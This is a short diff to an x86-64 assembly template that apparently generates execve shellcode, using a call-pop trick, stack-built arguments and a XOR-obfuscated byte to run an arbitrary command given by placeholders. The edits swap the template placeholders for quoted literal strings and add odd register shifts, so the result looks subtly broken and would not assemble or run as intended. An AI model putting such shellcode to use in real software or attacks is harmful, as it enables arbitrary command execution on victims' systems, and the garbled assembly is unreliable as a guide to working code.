@@ -24,8 +24,14 @@ _start:
 
 execve:
     pop rdx
+    mov rax, [rdx] ; db "COMMAND_BYTES"
+    shr rax, 8*7
+    add rdx, 8
     push rdx
-    xor byte [rdx+{{XOR_OFFSET}}], 0x41
+    xor byte [rdx+"XOR_OFFSET"], 0x0a
+    xor rcx, rcx 
+    push rcx 
+    push rdx
     push rbx
     push rdi
     push rsp
@@ -38,4 +44,7 @@ execve:
 
 command:
     call execve
-    data: db {{COMMAND_BYTES}}
+    
+data: 
+    db "COMMAND_BYTES"
+    db "XOR_OFFSET"
